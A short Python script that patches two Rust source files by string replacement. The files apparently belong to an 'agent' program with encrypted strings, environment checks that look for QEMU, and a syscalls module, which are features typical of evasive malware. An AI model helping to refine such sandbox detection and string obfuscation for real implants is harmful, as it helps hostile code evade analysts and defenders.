import re
with open("agent/src/env_check.rs", "r") as f:
    content = f.read()

content = content.replace("const NEEDLES: &[&str] = &[", "let needles = vec![")
content = content.replace("];\n    // std::str::from_utf8", "];\n    // std::str::from_utf8")
content = content.replace("std::str::from_utf8(&string_crypt::enc_str!", "String::from_utf8(string_crypt::enc_str!")
content = content.replace(")).unwrap()", ").to_vec()).unwrap()")
content = content.replace("if NEEDLES.iter().any(|n| s.contains(n)) {", "if needles.iter().any(|n| s.contains(n.as_str())) {")
# Fix the slice indexing issue in QEMU
content = content.replace("std::str::from_utf8(&string_crypt::enc_str!(\"QEMU\")[..4]).unwrap()", "String::from_utf8(string_crypt::enc_str!(\"QEMU\").to_vec()).unwrap().trim_end_matches('\\0')")

with open("agent/src/env_check.rs", "w") as f:
    f.write(content)

with open("agent/src/syscalls.rs", "r") as f:
    content = f.read()
content = content.replace("std::str::from_utf8(&string_crypt::enc_str!", "String::from_utf8(string_crypt::enc_str!")
content = content.replace(")).unwrap()", ").to_vec()).unwrap()")
with open("agent/src/syscalls.rs", "w") as f:
    f.write(content)

